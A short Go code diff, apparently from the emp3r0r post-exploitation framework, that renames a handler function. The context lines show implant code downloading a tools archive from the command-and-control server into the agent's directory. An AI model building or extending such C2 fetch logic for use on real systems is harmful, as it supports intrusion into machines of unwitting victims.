@@ -16,7 +16,7 @@ import (
 	"github.com/mholt/archiver"
 )
 
-func vaccineHandler() (out string) {
+func VaccineHandler() (out string) {
 	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", emp3r0r_data.AgentRoot+"/utils.tar.bz2")
 	out = "[+] Utils have been successfully installed"
